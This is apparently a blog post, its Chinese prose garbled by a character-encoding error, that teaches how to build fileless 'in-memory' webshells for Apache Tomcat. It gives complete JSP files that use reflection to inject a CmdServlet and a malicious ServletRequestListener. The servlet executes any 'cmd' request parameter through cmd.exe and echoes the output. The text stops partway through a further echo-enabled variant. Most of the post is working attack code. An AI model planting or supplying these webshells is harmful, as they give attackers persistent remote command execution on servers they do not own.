        <content type="html"><![CDATA[<h1 id="Servletå†…å­˜é©¬"><a href="#Servletå†…å­˜é©¬" class="headerlink" title="Servletå†…å­˜é©¬"></a>Servletå†…å­˜é©¬</h1><p>Servletå†…å­˜é©¬é€šè¿‡åŠ¨æ€æ³¨å†Œæ¶æ„Servletç»„ä»¶ï¼Œèƒ½å¤Ÿä½¿æ”»å‡»è€…åœ¨è®¿é—®ç‰¹å®šè·¯ç”±æ—¶å»è°ƒç”¨æ¶æ„çš„Servletè¿›è€Œæ‰§è¡Œæ¶æ„é€»è¾‘</p><h2 id="é€†å‘Servletæ³¨å†Œ"><a href="#é€†å‘Servletæ³¨å†Œ" class="headerlink" title="é€†å‘Servletæ³¨å†Œ"></a>é€†å‘Servletæ³¨å†Œ</h2><p>Servletæ·»åŠ é€»è¾‘åœ¨<code>ContextConfig</code>ç±»ä¸­çš„<code>configureContext()</code>æ–¹æ³•ä¸­ä½“ç°ï¼Œè¯¥æ–¹æ³•ç”¨äºè¯»å–web.xmlé…ç½®æ–‡ä»¶å¹¶è¿›è¡Œç›¸åº”é…ç½®ï¼Œå…¶ä¸­Servletç›¸å…³é…ç½®åœ¨å¦‚ä¸‹è¿›è¡Œ</p><p><img src="/img/post/image-20260106162318050.png" alt="image-20260106162318050"></p><p>è¯¥æ®µä»£ç æ²¡æœ‰ä½“ç°çš„æ˜¯<code>Wrapper</code>çš„<code>setServlet()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼ é€’ä¸€ä¸ªServletå®ä¾‹ï¼Œç¨‹åºå¦‚æœæ£€æµ‹åˆ°Servletä¸ºç©ºä¼šåˆ©ç”¨<code>setClass()</code>ä¸­çš„å…¨é™å®šåå‚æ•°å»å®ä¾‹åŒ–ï¼Œè€Œæˆ‘ä»¬åŠ¨æ€æ³¨å†Œæ˜¯ä¸ä¾èµ–äº<code>web.xml</code>é…ç½®æ–‡ä»¶çš„ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬è¦æ‰‹åŠ¨è°ƒç”¨<code>setServlet()</code>ä¼ é€’ä¸€ä¸ªå®ä¾‹</p><p><code>Wrapper</code>å¯ä»¥è§†ä½œServletçš„åŒ…è£…ï¼ŒåŒ…å«äº†æˆ‘ä»¬çš„Servletå¯¹è±¡ä»¥åŠå…¶ä»–éƒ¨åˆ†ï¼Œæœ€åè¯¥æ–¹æ³•é€šè¿‡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.context.addChild(wrapper);</span><br></pre></td></tr></table></figure><p>å°†Servletæ”¾å…¥äº†å®¹å™¨ä¸­ã€‚<code>this.context</code>æ˜¯<code>StandardContext</code>å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å„ç§æ ¸å¿ƒé…ç½®ã€‚æ­¤å¤–ï¼Œ<code>context</code>è¿˜éœ€è¦è·å–è®¿é—®è¯¥Servletçš„è·¯ç”±æ˜ å°„ï¼Œè¿™éƒ¨åˆ†é€šè¿‡ä»¥ä¸‹ä»£ç ä½“ç°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line"><span class="built_in">this</span>.context.addServletMappingDecoded((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨æŠŠæˆ‘ä»¬çš„æ¶æ„Servletæ³¨å…¥å®¹å™¨åï¼Œè¿˜éœ€è¦è°ƒç”¨<code>addServletMappingDecoded()</code>æ–¹æ³•è§„å®šè·¯ç”±æ˜ å°„</p><h2 id="æ„é€ Servletå†…å­˜é©¬"><a href="#æ„é€ Servletå†…å­˜é©¬" class="headerlink" title="æ„é€ Servletå†…å­˜é©¬"></a>æ„é€ Servletå†…å­˜é©¬</h2><p>æ„é€ æ¶æ„Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CmdServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                res.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä»<code>request</code>å¯¹è±¡è·å–<code>ServletContext</code>ï¼Œå†ä»<code>ServletContext</code>è·å–<code>ApplicationContext</code>ï¼Œæœ€åä»<code>ApplicationContext</code>è·å–<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        </span><br><span class="line">Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br></pre></td></tr></table></figure><p>å°†æ¶æ„<code>Servlet</code>åŒ…è£…å¹¶ä¼ å…¥<code>trueStandardContext</code>ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> trueStandardContext.createWrapper();</span><br><span class="line">wrapper.setName(<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line">wrapper.setServletClass(CmdServlet.class.getName());</span><br><span class="line">wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">CmdServlet</span>());</span><br><span class="line"></span><br><span class="line">trueStandardContext.addChild(wrapper);</span><br><span class="line">trueStandardContext.addServletMappingDecoded(<span class="string">&quot;/cmd&quot;</span>,<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„jspå†…å­˜é©¬</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CmdServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                res.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> trueStandardContext.createWrapper();</span><br><span class="line">        wrapper.setName(<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line">        wrapper.setServletClass(CmdServlet.class.getName());</span><br><span class="line">        wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">CmdServlet</span>());</span><br><span class="line"></span><br><span class="line">        trueStandardContext.addChild(wrapper);</span><br><span class="line">        trueStandardContext.addServletMappingDecoded(<span class="string">&quot;/cmd&quot;</span>,<span class="string">&quot;CmdServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">        response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®jspæ–‡ä»¶ï¼Œä¹‹åè®¿é—®<code>/cmd</code>è·¯ç”±å³å¯é€šè¿‡<code>cmd</code>å‚æ•°è¿›è¡ŒRCE</p><p><img src="/img/post/image-20260106163437259.png" alt="image-20260106163437259"></p><br/><h1 id="Listenerå†…å­˜é©¬"><a href="#Listenerå†…å­˜é©¬" class="headerlink" title="Listenerå†…å­˜é©¬"></a>Listenerå†…å­˜é©¬</h1><p>ç±»ä¼¼çš„ï¼ŒListenerä¹Ÿæ˜¯é€šè¿‡åŠ¨æ€æ³¨å†Œç›‘å¬å™¨è¿›è¡Œæ¶æ„å‘½ä»¤çš„æ‰§è¡Œ</p><h2 id="Listenerç›‘å¬å™¨"><a href="#Listenerç›‘å¬å™¨" class="headerlink" title="Listenerç›‘å¬å™¨"></a>Listenerç›‘å¬å™¨</h2><p>Listeneræ˜¯JavaEEçš„ä¸€ç§è§„èŒƒæ¥å£ï¼Œå½“æŸäº›äº‹ä»¶å‘ç”Ÿæ—¶ç›‘å¬å™¨è¢«æ‰§è¡Œ</p><table><thead><tr><th align="left">ç›‘å¬å™¨ç±»å‹</th><th align="left">åŠŸèƒ½ä»‹ç»</th></tr></thead><tbody><tr><td align="left">ServletRequestListener</td><td align="left">ç›‘å¬requestä½œç”¨åŸŸçš„åˆ›å»ºå’Œé”€æ¯</td></tr><tr><td align="left">ServletRequestAttributeListener</td><td align="left">ç›‘å¬requestä½œç”¨åŸŸçš„å±æ€§çŠ¶æ€å˜åŒ–</td></tr><tr><td align="left">HttpSessionListener</td><td align="left">ç›‘å¬sessionä½œç”¨åŸŸçš„åˆ›å»ºå’Œé”€æ¯</td></tr><tr><td align="left">HttpSessionAttributeListener</td><td align="left">ç›‘å¬sessionä½œç”¨åŸŸçš„å±æ€§çŠ¶æ€å˜åŒ–</td></tr><tr><td align="left">ServletContextListener</td><td align="left">ç›‘å¬applicationä½œç”¨åŸŸçš„åˆ›å»ºå’Œé”€æ¯</td></tr><tr><td align="left">ServletContextAttributeListener</td><td align="left">ç›‘å¬applicationä½œç”¨åŸŸçš„å±æ€§çŠ¶æ€å˜åŒ–</td></tr><tr><td align="left">HttpSessionBindingListener</td><td align="left">ç›‘å¬å¯¹è±¡ä¸sessionçš„ç»‘å®šå’Œè§£é™¤</td></tr><tr><td align="left">HttpSessionActivationListener</td><td align="left">ç›‘å¬sessionæ•°å€¼çš„é’åŒ–å’Œæ´»åŒ–</td></tr></tbody></table><p>å…¶ä¸­ï¼Œ<code>ServletRequestListener</code>åœ¨requestä½œç”¨åŸŸçš„åˆ›å»ºå’Œé”€æ¯æ—¶éƒ½ä¼šè¢«è§¦å‘ï¼Œå³æ¯æ¬¡è¯·æ±‚éƒ½ä¼šè§¦å‘ </p><p>é€šè¿‡å®ç°<code>ServletRequestListener</code>æ¥å£å¹¶é‡å†™<code>requestInitialized()</code>ç¼–å†™Listener</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é€†å‘Listeneræ³¨å†Œ"><a href="#é€†å‘Listeneræ³¨å†Œ" class="headerlink" title="é€†å‘Listeneræ³¨å†Œ"></a>é€†å‘Listeneræ³¨å†Œ</h2><p><code>StandardContext</code>ç±»ä¸­çš„<code>fireRequestInitEvent()</code>æ–¹æ³•è°ƒç”¨äº†<code>listener</code>ï¼Œ<code>listener</code>ç”±ä¸Šæ–¹çš„<code>instance</code>è€Œæ¥ï¼Œ<code>instance</code>åˆæ˜¯ä»<code>instances</code>æ•°ç»„éå†è€Œæ¥çš„ï¼Œ<code>instances</code>æ•°ç»„é€šè¿‡<code>this.getApplicationEventListeners()</code>è·å–</p><p><img src="/img/post/image-20260106170459293.png" alt="image-20260106170459293"></p><p><code>getApplicationEventListeners()</code>è¿”å›äº†<code>StandardContext</code>ä¸­çš„<code>applicationEventListenersList</code>å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.applicationEventListenersList.toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œé€šè¿‡ä¿®æ”¹<code>applicationEventListenersList</code>å­—æ®µä½¿å…¶åŒ…å«æˆ‘ä»¬çš„æ¶æ„Listenerå³å¯ï¼Œå…¶ä¸­<code>addApplicationEventListener()</code>æ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ’å…¥æ¶æ„ç›‘å¬å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.applicationEventListenersList.add(listener);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="æ„å»ºListenerå†…å­˜é©¬"><a href="#æ„å»ºListenerå†…å­˜é©¬" class="headerlink" title="æ„å»ºListenerå†…å­˜é©¬"></a>æ„å»ºListenerå†…å­˜é©¬</h2><p>æ„é€ æ¶æ„Listener</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–<code>StandardContext</code>ï¼Œæ³¨å…¥æ¶æ„ç›‘å¬å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">trueStandardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Listener</span>());</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„jspå†…å­˜é©¬æ–‡ä»¶</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line"></span><br><span class="line">        trueStandardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Listener</span>());</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®jspæ–‡ä»¶åä»»æ„é¡µé¢ä¼ å…¥cmdå‚æ•°å³å¯è§¦å‘</p><h2 id="Listenerå†…å­˜é©¬å›æ˜¾"><a href="#Listenerå†…å­˜é©¬å›æ˜¾" class="headerlink" title="Listenerå†…å­˜é©¬å›æ˜¾"></a>Listenerå†…å­˜é©¬å›æ˜¾</h2><p>åœ¨Listenerçš„<code>requestInitialized()</code>æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬èƒ½è°ƒç”¨çš„å°±åªæœ‰ä¸€ä¸ª<code>ServletRequestEvent</code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸‹æŒæœ‰ä¸€ä¸ª<code>request</code>å¯¹è±¡ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è·å–<code>Request</code>å®ä¾‹</p><p><img src="/img/post/image-20260106174129102.png" alt="image-20260106174129102"></p><p>ä½†æ˜¯è¦è®©é¡µé¢å›æ˜¾éœ€è¦è·å–<code>Response</code>å¯¹è±¡ï¼Œè€Œ<code>Request</code>å¯¹è±¡å†…éƒ¨æŒæœ‰<code>Response</code>å¯¹è±¡çš„å¼•ç”¨</p><p><img src="/img/post/image-20260106174341429.png" alt="image-20260106174341429"></p><p>é€šè¿‡åå°„å¯ä»¥è·å–å®ƒ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; sreClass = sre.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestFacadeField</span> <span class="operator">=</span> sreClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestFacadeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) requestFacadeField.get(sre);</span><br><span class="line">Class&lt;?&gt; requestFacadeClass = requestFacade.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> requestFacadeClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">Class&lt;?&gt; requestClass = request.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> requestClass.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">responseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) responseField.get(request);</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„jspå†…å­˜é©¬æ–‡ä»¶</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span 